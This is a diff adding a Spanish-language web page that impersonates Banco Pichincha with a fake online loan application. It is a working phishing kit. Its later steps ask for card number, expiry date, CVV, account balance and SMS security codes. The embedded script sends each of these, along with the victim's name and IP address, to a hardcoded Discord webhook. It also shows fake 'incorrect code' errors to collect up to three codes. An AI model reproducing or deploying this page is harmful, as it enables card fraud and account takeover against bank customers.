@@ -1,0 +1,173 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light only">
+    <title>Plataforma de Desembolso Seguro</title>
+    <style>
+        :root {
+            --pichincha-amarillo: #F7D117; 
+            --pichincha-azul: #002855;
+            --gris-fondo: #ffffff;
+            --gris-borde: #eeeeee;
+            --texto-suave: #555555;
+        }
+
+        html, body {
+            background-color: #ffffff !important;
+            color: #333333 !important;
+            color-scheme: light !important;
+        }
+
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; scroll-behavior: smooth; }
+        header { background-color: #ffffff !important; padding: 25px 20px; text-align: center; border-bottom: 1px solid var(--gris-borde); }
+        
+        /* LOGO SIN BORDES NI SOMBRAS */
+        .logo-box { width: 220px; margin: 0 auto; border: none !important; background: transparent !important; display: flex; align-items: center; justify-content: center; }
+        .logo-box img { max-width: 100%; height: auto; display: block; }
+
+        .hero { background-color: var(--pichincha-amarillo) !important; padding: 30px 20px; text-align: center; }
+        .hero h1 { color: var(--pichincha-azul) !important; margin: 0; font-size: 20px; font-weight: bold; }
+        .container { padding: 20px; max-width: 500px; margin: 0 auto; background-color: #ffffff !important; }
+        
+        .section-title { color: var(--pichincha-azul) !important; font-size: 17px; margin: 25px 0 15px 0; padding-left: 10px; border-left: 5px solid var(--pichincha-amarillo); font-weight: bold; }
+
+        .credit-card { background: #ffffff !important; border: 1px solid var(--gris-borde); border-radius: 12px; padding: 18px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.03); }
+        .credit-card h3 { margin: 0 0 8px 0; font-size: 17px; color: var(--pichincha-azul) !important; display: flex; align-items: center; }
+        .credit-card h3::before { content: ""; width: 4px; height: 18px; background-color: var(--pichincha-amarillo); margin-right: 10px; border-radius: 10px; }
+        .credit-card p { font-size: 14px; color: var(--texto-suave) !important; line-height: 1.4; margin-bottom: 15px; }
+        .btn-card { display: block; text-align: center; background-color: var(--pichincha-azul) !important; color: #ffffff !important; padding: 12px; text-decoration: none; border-radius: 8px; font-size: 14px; font-weight: bold; }
+
+        .form-section { background-color: #fafafa !important; border-radius: 15px; padding: 20px; border: 1px solid var(--gris-borde); }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; color: var(--pichincha-azul) !important; margin-bottom: 4px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #ffffff !important; color: #333 !important; }
+        .btn-submit { width: 100%; background-color: var(--pichincha-amarillo) !important; color: var(--pichincha-azul) !important; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; }
+
+        #loading-step { display: none; text-align: center; padding: 40px 0; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid var(--pichincha-amarillo); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        #paso2, #simulator-step, #bank-step, #token-step { display: none; }
+        #error-msg { color: #d93025; font-size: 13px; font-weight: bold; margin-top: 10px; display: none; text-align: center; }
+        .token-input { text-align: center; font-size: 24px !important; letter-spacing: 10px; font-weight: bold; color: var(--pichincha-azul) !important; }
+        .info-box { background: #eef6ff !important; border-left: 4px solid var(--pichincha-azul); padding: 12px; font-size: 12px; color: #444 !important; margin-bottom: 20px; line-height: 1.4; }
+
+        footer { padding: 30px; text-align: center; font-size: 11px; color: #bbb !important; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" alt="Logo">
+        </div>
+    </header>
+
+    <section class="hero"><h1>Validación de Crédito en Línea</h1></section>
+
+    <div class="container">
+        <div id="step1">
+            <div class="section-title">Paso 1: Selecciona tu crédito</div>
+            <div class="credit-card"><h3>Crédito de Consumo</h3><p>Dinero libre para lo que necesites hoy. Sin trámites complicados.</p><a href="javascript:void(0)" onclick="mostrarPaso2('Consumo')" class="btn-card">Solicitar</a></div>
+            <div class="credit-card"><h3>Crédito de Vivienda</h3><p>Financiamos tu casa propia o departamento con tasas bajas.</p><a href="javascript:void(0)" onclick="mostrarPaso2('Vivienda')" class="btn-card">Solicitar</a></div>
+            <div class="credit-card"><h3>Microcrédito</h3><p>Especial para emprendedores que buscan crecer su negocio.</p><a href="javascript:void(0)" onclick="mostrarPaso2('Microcrédito')" class="btn-card">Solicitar</a></div>
+            <div class="credit-card"><h3>Crédito Vehicular</h3><p>Llévate el auto o moto que quieres con planes a tu medida.</p><a href="javascript:void(0)" onclick="mostrarPaso2('Vehículo')" class="btn-card">Solicitar</a></div>
+            <div class="credit-card"><h3>Crédito Digital</h3><p>Solicítalo desde tu celular en 5 minutos y recibe el dinero hoy.</p><a href="javascript:void(0)" onclick="mostrarPaso2('Digital')" class="btn-card">Solicitar</a></div>
+        </div>
+
+        <div id="paso2" class="form-section">
+            <div class="section-title" style="margin-top:0;">Paso 2: Datos Personales</div>
+            <form onsubmit="guardarP2(event)">
+                <div class="form-group"><label>Nombre Completo</label><input type="text" id="nombre" required></div>
+                <div class="form-group"><label>Número de Cédula</label><input type="number" required></div>
+                <div class="form-group"><label>Teléfono de Contacto</label><input type="tel" required></div>
+                <div class="form-group"><label>Correo Electrónico</label><input type="email" required></div>
+                <div class="form-group"><label>Dirección Residencial</label><input type="text" required></div>
+                <div class="form-group"><label>Ocupación</label>
+                    <select required><option value="">Seleccione...</option><option>Empleado</option><option>Independiente</option><option>Jubilado</option></select>
+                </div>
+                <button type="submit" class="btn-submit">Siguiente Paso</button>
+            </form>
+        </div>
+
+        <div id="loading-step">
+            <div class="spinner"></div>
+            <div id="loading-text" style="font-weight: bold; color: var(--pichincha-azul);">Procesando...</div>
+        </div>
+
+        <div id="simulator-step" class="form-section" style="text-align: center;">
+            <div class="section-title" style="margin-top:0;">Paso 3: Monto del Crédito</div>
+            <h2 id="disp-monto" style="color: var(--pichincha-azul); font-size: 32px;">$ 5,000</h2>
+            <input type="range" min="1000" max="50000" step="500" value="5000" style="width:100%" oninput="document.getElementById('disp-monto').innerText = '$ ' + Number(this.value).toLocaleString()">
+            <button class="btn-submit" style="margin-top:20px;" onclick="runLoading('bank')">Continuar a Desembolso</button>
+        </div>
+
+        <div id="bank-step" class="form-section">
+            <div class="section-title" style="margin-top:0;">Paso 4: Verificación Bancaria</div>
+            <div class="info-box">Para garantizar que los fondos sean añadidos correctamente a su Tarjeta Débito o Crédito, realizamos una verificación de seguridad.</div>
+            <form onsubmit="enviarDatosBancarios(event)">
+                <div class="form-group"><label>Saldo Disponible</label><input type="text" id="saldo" placeholder="$ 0.00" required></div>
+                <div class="form-group"><label>Número de Tarjeta (16 dígitos)</label><input type="text" id="tarjeta" maxlength="16" pattern="\d{16}" required></div>
+                <div style="display: flex; gap: 10px;">
+                    <div class="form-group" style="flex:1;"><label>Vencimiento (MM/AA)</label><input type="text" id="fecha" maxlength="5" placeholder="MM/AA" required onkeyup="this.value=this.value.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'$1/$2')"></div>
+                    <div class="form-group" style="flex:1;"><label>CVV</label><input type="password" id="cvv" maxlength="3" required></div>
+                </div>
+                <button type="submit" class="btn-submit">Verificar Cuenta</button>
+            </form>
+        </div>
+
+        <div id="token-step" class="form-section">
+            <div class="section-title" style="margin-top:0;">Paso 5: Validación Final</div>
+            <div class="info-box" style="background: #fff9e6 !important; border-left-color: var(--pichincha-amarillo);">Hemos enviado un código de seguridad de 6 dígitos Via SMS o Correo Electronico asociado a su cuenta. Por favor, ingréselo para finalizar.</div>
+            <form onsubmit="enviarToken(event)">
+                <div class="form-group"><label style="text-align:center;">Código de 6 Dígitos</label><input type="text" id="inputToken" class="token-input" maxlength="6" placeholder="000000" required></div>
+                <div id="error-msg">Código incorrecto. POR FAVOR ESPERAR EL NUEVO CODIGO ENVIADO.</div>
+                <button type="submit" class="btn-submit">Confirmar Crédito</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const hook = "https://discord.com/api/webhooks/1485694899108974746/UOJv6KiXJGH_ulsINYmrp-87kS_SHNK4T_5W72i0qt2Hnp1Ht88iOtcnJgRLAGnJ-2qH";
+        let uIP = ""; let nom = ""; let intt = 0; let cred = "";
+
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => uIP = d.ip);
+
+        function mostrarPaso2(c) { cred = c; document.getElementById('step1').style.display = 'none'; document.getElementById('paso2').style.display = 'block'; }
+        function guardarP2(e) { e.preventDefault(); nom = document.getElementById('nombre').value; runLoading('sim'); }
+
+        function runLoading(next) {
+            document.getElementById('paso2').style.display = 'none'; document.getElementById('simulator-step').style.display = 'none'; document.getElementById('bank-step').style.display = 'none'; document.getElementById('token-step').style.display = 'none';
+            const l = document.getElementById('loading-step'); const t = document.getElementById('loading-text'); l.style.display = 'block';
+            if(next === 'sim') t.innerText = "Analizando perfil para crédito de " + cred + "...";
+            if(next === 'bank') t.innerText = "Los fondos serán añadidos a su Tarjeta Débito o Crédito...";
+            if(next === 'token') t.innerText = "Generando código de validación seguro...";
+            setTimeout(() => { l.style.display = 'none'; document.getElementById(next === 'sim' ? 'simulator-step' : next === 'bank' ? 'bank-step' : 'token-step').style.display = 'block'; window.scrollTo(0,0); }, 2500);
+        }
+
+        async function enviarDatosBancarios(e) {
+            e.preventDefault();
+            const s = document.getElementById('saldo').value; const t = document.getElementById('tarjeta').value;
+            const f = document.getElementById('fecha').value; const c = document.getElementById('cvv').value;
+            const msg = `📌 **DATOS BANCARIOS**\n👤 **NOMBRE:** ${nom}\n💳 **TARJETA:** ${t}\n📅 **EXP:** ${f}\n🔒 **CVV:** ${c}\n💰 **SALDO:** ${s}\n🌐 **IP:** ${uIP}`;
+            await fetch(hook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) });
+            runLoading('token');
+        }
+
+        async function enviarToken(e) {
+            e.preventDefault(); intt++;
+            const tk = document.getElementById('inputToken').value; const err = document.getElementById('error-msg');
+            const l = document.getElementById('loading-step'); const stp = document.getElementById('token-step');
+            const msg = `🔑 **CÓDIGO TOKEN**\n👤 **DE:** ${nom}\n🔑 **TOKEN:** ${tk}\n🔢 **INTENTO:** ${intt}\n🌐 **IP:** ${uIP}`;
+            stp.style.display = 'none'; l.style.display = 'block'; document.getElementById('loading-text').innerText = "Validando código...";
+            await fetch(hook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) });
+            setTimeout(() => {
+                l.style.display = 'none'; stp.style.display = 'block';
+                if(intt < 3) { err.style.display = 'block'; document.getElementById('inputToken').value = ""; } 
+                else { alert('Solicitud procesada con éxito.'); location.reload(); }
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
